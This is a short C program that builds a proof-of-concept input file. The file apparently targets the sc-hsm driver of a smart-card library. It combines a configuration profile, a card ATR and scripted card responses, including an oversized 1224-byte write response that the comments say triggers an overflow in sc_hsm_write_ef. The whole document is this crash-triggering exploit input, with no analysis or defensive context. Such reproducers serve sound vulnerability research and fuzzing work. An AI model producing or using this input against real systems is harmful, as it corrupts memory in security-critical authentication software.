#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    // Part 1: Scconf profile text (null-terminated)
    // Profile that triggers a large EF write in sc_hsm_write_ef
    fprintf(f, "[card]\n");
    fprintf(f, "driver = sc-hsm\n");
    fprintf(f, "[newfile]\n");
    fprintf(f, "type = data\n");
    fprintf(f, "file-id = 0x0001\n");
    fprintf(f, "size = 32767\n");  // Large size to trigger overflow
    fprintf(f, "[tokeninfo]\n");
    fprintf(f, "label = test\n");
    fputc(0x00, f); // Null separator

    // Part 2: Reader binary data (little-endian lengths)
    // ATR chunk: 2-byte little-endian length + ATR bytes
    fputc(0x0C, f); fputc(0x00, f); // Length = 12 (little-endian)
    // 12-byte ATR that maps to SC-HSM driver
    fputc(0x3B, f);
    fputc(0x7F, f);
    fputc(0x96, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);

    // Driver name: null-terminated string
    fprintf(f, "sc-hsm");
    fputc(0x00, f);

    // APDU response chunks: each is 2-byte little-endian length + data (including SW bytes at end)
    // Response 1: SELECT FILE success (2 bytes SW)
    fputc(0x02, f); fputc(0x00, f); // Length = 2
    fputc(0x90, f); fputc(0x00, f); // SW1, SW2

    // Response 2: READ BINARY success (2 bytes SW)
    fputc(0x02, f); fputc(0x00, f); // Length = 2
    fputc(0x90, f); fputc(0x00, f); // SW1, SW2

    // Response 3: UPDATE BINARY with crafted large length to trigger overflow
    // Length = 1224 (0x04C8) in little-endian = 0xC8 0x04
    fputc(0xC8, f); fputc(0x04, f);
    // Write 1222 bytes of dummy data + 2 bytes SW
    for (int i = 0; i < 1222; i++) {
        fputc(0x41, f);
    }
    fputc(0x90, f); fputc(0x00, f); // SW1, SW2 at end

    // Additional safe response chunks
    for (int i = 0; i < 10; i++) {
        fputc(0x02, f); fputc(0x00, f);
        fputc(0x90, f); fputc(0x00, f);
    }

    fclose(f);
    return 0;
}